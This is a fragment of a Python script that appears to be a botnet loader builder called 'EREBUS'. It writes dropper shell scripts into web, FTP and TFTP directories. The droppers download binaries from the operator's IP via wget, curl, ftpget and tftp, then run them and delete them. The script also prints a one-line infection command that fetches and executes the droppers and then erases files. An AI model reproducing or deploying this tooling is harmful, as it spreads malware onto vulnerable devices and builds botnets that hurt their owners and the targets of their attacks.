...
run('echo "#!/bin/bash" > /var/lib/tftpboot/tEREBUS.sh')



run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tEREBUS.sh')



run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tEREBUS.sh')



run('echo "#!/bin/bash" > /var/lib/tftpboot/tEREBUS2.sh')



run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tEREBUS2.sh')



run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tEREBUS2.sh')



run('echo "#!/bin/bash" > /var/www/html/EREBUS.sh')



for i in compileas:

    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; curl -O http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/EREBUS.sh')

    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/EREBUS1.sh')

    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tEREBUS.sh')

    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tEREBUS2.sh')
...
print("\x1b[0;32mYour link: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/EREBUS.sh; curl -O http://" + ip + "/EREBUS.sh; chmod 777 EREBUS.sh; sh EREBUS.sh; tftp " + ip + " -c get tEREBUS.sh; chmod 777 tEREBUS.sh; sh tEREBUS.sh; tftp -r tEREBUS2.sh -g " + ip + "; chmod 777 tEREBUS2.sh; sh tEREBUS2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " EREBUS1.sh EREBUS1.sh; sh EREBUS1.sh; rm -rf EREBUS.sh tEREBUS.sh tEREBUS2.sh EREBUS1.sh; rm -rf *\x1b[0m")

print("");

print("\x1b[0;32mCoded By Void\r\nEdited By DaddyL33T\x1b[0m")